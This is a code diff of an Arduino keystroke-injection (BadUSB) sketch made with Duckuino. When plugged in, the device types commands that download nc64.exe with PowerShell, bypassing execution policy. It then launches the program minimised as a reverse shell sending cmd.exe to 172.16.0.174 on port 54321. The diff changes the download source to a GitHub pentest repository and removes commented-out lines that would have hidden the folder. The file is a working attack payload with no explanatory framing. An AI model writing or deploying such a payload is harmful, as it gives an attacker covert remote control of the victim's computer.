@@ -120,6 +120,7 @@ void loop() {
 
 
 
+
 /**
  * Made with Duckuino, an open-source project.
  * Check the license at 'https://github.com/Nurrl/Duckuino/blob/master/LICENSE'
@@ -154,7 +155,7 @@ void setup()
   typeKey(KEY_RETURN);
 
   delay(300);
-  Keyboard.print(F("cd / & mkdir win & cd win & echo (wget 'http://artacyber.persiangig.com/.3HZAOFaX5J/nc64.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1"));
+  Keyboard.print(F("cd / & mkdir win & cd win & echo (wget 'https://raw.githubusercontent.com/phackt/pentest/master/privesc/windows/nc64.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1"));
 
   typeKey(KEY_RETURN);
   delay(300);
@@ -162,15 +163,6 @@ void setup()
   Keyboard.print(F("START /MIN a.exe 172.16.0.174 54321 -e cmd.exe -d & exit"));
 
   typeKey(KEY_RETURN);
-  
-  //delay(300);
-  //Keyboard.print(F("cd .."));
-//  typeKey(KEY_RETURN);
-  
- // delay(10000);
- // Keyboard.print(F("attrib +h +s win & exit"));
- // typeKey(KEY_RETURN);
-  
 
   // Ending stream
   Keyboard.end();
